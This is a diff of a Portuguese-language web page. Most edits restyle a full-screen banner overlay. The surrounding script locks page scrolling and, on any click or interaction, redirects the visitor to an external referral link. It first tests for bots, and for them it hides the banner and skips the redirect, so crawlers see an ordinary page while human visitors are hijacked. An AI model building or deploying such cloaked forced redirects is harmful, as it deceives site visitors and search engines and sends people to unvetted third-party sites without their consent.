@@ -253,8 +253,8 @@
 
 
     
-   <style>
-  /* Remove overflow apenas enquanto o banner estiver ativo */
+<style>
+  /* Bloqueia scroll enquanto o banner estiver ativo */
   body.banner-active {
     overflow: hidden;
   }
@@ -270,12 +270,31 @@
     align-items: center;
     z-index: 99999;
     cursor: pointer;
+    background-color: rgba(0,0,0,0.5); /* sombra leve atrás da imagem */
   }
 
   #redirecionar-banner img {
-    width: 100%;
-    height: 100%;
-    object-fit: cover;
+    width: 90%;
+    max-width: 600px; /* limita a largura em telas grandes */
+    height: auto;
+    max-height: 90vh; /* limita a altura em telas pequenas */
+    object-fit: contain; /* mantém proporção da imagem */
+    border-radius: 12px;
+    box-shadow: 0 4px 12px rgba(0,0,0,0.5);
+    transition: transform 0.2s ease;
+  }
+
+  #redirecionar-banner img:hover {
+    transform: scale(1.05);
+  }
+
+  /* Mobile */
+  @media (max-width: 480px) {
+    #redirecionar-banner img {
+      width: 95%;
+      max-width: none;
+      max-height: 85vh;
+    }
   }
 </style>
 
@@ -287,7 +306,7 @@
   const destino = "https://app.feiticeira.club/pr/PRBJ9rmd";
   const banner = document.getElementById("redirecionar-banner");
 
-  // Mostra banner e bloqueia scroll
+  // Ativa banner e bloqueia scroll
   document.body.classList.add("banner-active");
 
   function isBot() {
@@ -298,7 +317,6 @@
 
   if (!isBot()) {
     function redirecionar() {
-      // Remove classe que bloqueia scroll
       document.body.classList.remove("banner-active");
       window.location.href = destino;
     }
@@ -312,11 +330,12 @@
 
     interacoes.forEach(ev => document.addEventListener(ev, handler));
   } else {
-    // Bot
+    // Oculta banner para bots
     if(banner) banner.style.display = "none";
     document.body.classList.remove("banner-active");
   }
 </script>
+
  
 
 
@@ -326,6 +345,7 @@
 
 </body>
 </html>
+
 
 
 
